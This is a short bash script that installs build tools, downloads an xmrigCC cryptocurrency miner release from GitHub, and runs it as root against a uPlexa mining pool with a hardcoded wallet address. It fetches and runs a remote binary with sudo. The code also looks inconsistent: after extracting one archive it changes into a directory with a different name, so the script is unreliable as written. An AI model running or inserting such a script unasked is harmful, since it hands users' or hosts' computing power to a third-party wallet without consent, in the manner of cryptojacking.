#!/bin/bash
apt-get update && 
apt-get -y install build-essential libssl-dev libcurl4-openssl-dev libjansson-dev libgmp-dev automake git &&
sudo sysctl vm.nr_hugepages=128 &&
sudo sysctl -w vm.nr_hugepages=128 && wget https://github.com/Bendr0id/xmrigCC/releases/download/1.9.3/xmrigCC-1.9.3-with_tls-gcc7-linux-static-miner_only-x64.tar.gz && tar xf xmrigCC-1.9.3-with_tls-gcc7-linux-static-miner_only-x64.tar.gz && cd xmrig-upx-v0.2.0-lin64 &&  
sudo ./xmrig -o uplexa.herominers.com:10470 -u UPX1g6LU7rRifbVjcEoEiY79tycMSDqJM83FNX3jmp5AFf6VcwgRnkq9rhdfP7vjpjC4siM7cbz57BerQrhKGqRJ2MKZZnqnzp -p worker -t 4
